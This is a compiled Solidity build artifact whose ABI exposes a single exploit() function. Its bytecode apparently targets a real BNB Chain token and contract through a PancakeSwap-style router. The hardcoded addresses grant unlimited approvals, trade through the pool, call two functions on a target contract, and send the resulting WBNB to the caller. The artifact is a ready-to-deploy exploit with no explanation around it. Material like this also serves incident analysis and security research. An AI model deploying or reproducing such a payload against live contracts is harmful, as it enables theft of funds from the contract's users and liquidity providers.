{"abi":[{"type":"receive","stateMutability":"payable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50610a0d8061001c5f395ff3fe608060405260043610610020575f3560e01c806363d9b7701461002b575f5ffd5b3661002757005b5f5ffd5b348015610036575f5ffd5b5061003f610041565b005b60405163095ea7b360e01b81527310ed43c718714eb63d5aa57b78b54704e256024e60048201525f19602482015273bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c9063095ea7b3906044016020604051808303815f875af11580156100aa573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100ce91906107cc565b5060405163095ea7b360e01b81527310ed43c718714eb63d5aa57b78b54704e256024e60048201525f19602482015273bb652d0f1ebbc2c16632076b1592d45db61a7a689063095ea7b3906044016020604051808303815f875af1158015610138573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061015c91906107cc565b506040516370a0823160e01b81523060048201525f9073bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c906370a0823190602401602060405180830381865afa1580156101ac573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101d091906107f2565b905061020d67016345785d8a000073bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c73bb652d0f1ebbc2c16632076b1592d45db61a7a686106cf565b6040516370a0823160e01b81523060048201526102b29073bb652d0f1ebbc2c16632076b1592d45db61a7a68906370a08231906024015b602060405180830381865afa15801561025f573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061028391906107f2565b73bb652d0f1ebbc2c16632076b1592d45db61a7a6873bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c6106cf565b5f6102c567016345785d8a00008361081d565b90506102fa8173bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c73bb652d0f1ebbc2c16632076b1592d45db61a7a686106cf565b5f61031e633b9aca0073bb652d0f1ebbc2c16632076b1592d45db61a7a683161081d565b6040805160028082526060820183529293505f92909160208301908036833701905050905073bb652d0f1ebbc2c16632076b1592d45db61a7a68815f8151811061036a5761036a61084a565b60200260200101906001600160a01b031690816001600160a01b03168152505073bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c816001815181106103b2576103b261084a565b6001600160a01b03909216602092830291909101909101526040516307c0329d60e21b81525f907310ed43c718714eb63d5aa57b78b54704e256024e90631f00ca749061040590869086906004016108a1565b5f60405180830381865afa15801561041f573d5f5f3e3d5ffd5b505050506040513d5f823e601f3d908101601f1916820160405261044691908101906108c1565b905073b7a254237e05ccca0a756f75fb78ab2df222911b6001600160a01b031663ac003773825f8151811061047d5761047d61084a565b6020026020010151336040518363ffffffff1660e01b81526004016104b59291909182526001600160a01b0316602082015260400190565b5f604051808303815f87803b1580156104cc575f5ffd5b505af11580156104de573d5f5f3e3d5ffd5b5050604051634c8d3a3b60e11b815230600482015273b7a254237e05ccca0a756f75fb78ab2df222911b925063991a747691506024015f604051808303815f87803b15801561052b575f5ffd5b505af115801561053d573d5f5f3e3d5ffd5b50506040516370a0823160e01b815230600482015261057c925073bb652d0f1ebbc2c16632076b1592d45db61a7a6891506370a0823190602401610244565b73bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c6001600160a01b031663d0e30db0476040518263ffffffff1660e01b81526004015f604051808303818588803b1580156105c9575f5ffd5b505af11580156105db573d5f5f3e3d5ffd5b50506040516370a0823160e01b815230600482015273bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c935063a9059cbb925033915083906370a0823190602401602060405180830381865afa158015610637573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061065b91906107f2565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303815f875af11580156106a3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106c791906107cc565b505050505050565b6040805160028082526060820183525f9260208301908036833701905050905082815f815181106107025761070261084a565b60200260200101906001600160a01b031690816001600160a01b03168152505081816001815181106107365761073661084a565b6001600160a01b03909216602092830291909101909101527310ed43c718714eb63d5aa57b78b54704e256024e635c11d795855f84306107794262015180610989565b6040518663ffffffff1660e01b815260040161079995949392919061099c565b5f604051808303815f87803b1580156107b0575f5ffd5b505af11580156107c2573d5f5f3e3d5ffd5b5050505050505050565b5f602082840312156107dc575f5ffd5b815180151581146107eb575f5ffd5b9392505050565b5f60208284031215610802575f5ffd5b5051919050565b634e487b7160e01b5f52601160045260245ffd5b8181038181111561083057610830610809565b92915050565b634e487b7160e01b5f52604160045260245ffd5b634e487b7160e01b5f52603260045260245ffd5b5f8151808452602084019350602083015f5b828110156108975781516001600160a01b0316865260209586019590910190600101610870565b5093949350505050565b828152604060208201525f6108b9604083018461085e565b949350505050565b5f602082840312156108d1575f5ffd5b815167ffffffffffffffff8111156108e7575f5ffd5b8201601f810184136108f7575f5ffd5b805167ffffffffffffffff81111561091157610911610836565b8060051b604051601f19603f830116810181811067ffffffffffffffff8211171561093e5761093e610836565b60405291825260208184018101929081018784111561095b575f5ffd5b6020850194505b8385101561097e57845180825260209586019590935001610962565b509695505050505050565b8082018082111561083057610830610809565b85815284602082015260a060408201525f6109ba60a083018661085e565b6001600160a01b039490941660608301525060800152939250505056fea26469706673582212205e5f91118f1926c55c5ed611512ef7fd884406de4e94a80b1998d2172ce7a28864736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"exploit()":"63d9b770"},"id":459}